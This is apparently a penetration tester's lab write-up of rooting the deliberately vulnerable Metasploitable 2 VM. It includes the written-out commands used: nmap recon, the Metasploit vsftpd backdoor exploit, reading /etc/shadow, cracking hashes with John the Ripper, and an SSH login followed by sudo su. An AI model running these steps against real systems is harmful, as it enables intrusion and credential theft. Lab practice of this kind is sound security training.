# I Pwned Metasploitable 2 - From Recon to Root

**Target:** Metasploitable 2 (Intentionally Vulnerable VM)
**Attacker:** Kali Linux
**Outcome:** Full root compromise - Proof: whoami = root

---

### Phase 1: Reconnaissance
```bash
nmap -sV -p- 192.168.56.101
Found vsftpd 2.3.4 on port 21 - vulnerable to backdoor.

### Phase 2: Initial Exploitation
msfconsole
use exploit/unix/ftp/vsftpd_234_backdoor
set RHOSTS 192.168.56.101
exploit
Result: Immediate root shell.

### Phase 3: Post-Exploitation
cat /etc/shadow
# Extracted hashes for msfadmin
john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
Cracked password for msfadmin.

SSH login with legacy options:
ssh -oKexAlgorithms=+diffie-hellman-group1-sha1 -oHostKeyAlgorithms=+ssh-rsa msfadmin@192.168.56.101
### Phase 4: Privilege Escalation
sudo su
whoami
# root
---

### Tools Used
- Nmap
- Metasploit Framework
- John the Ripper
- SSH

### Key Lessons
- Patch outdated services
- Enforce strong password policy
- Never set ALL=(ALL) NOPASSWD in sudoers

---
*Author:* 0xlysis | Penetration Tester | Port Harcourt, NG
*Date:* October 4th 2026
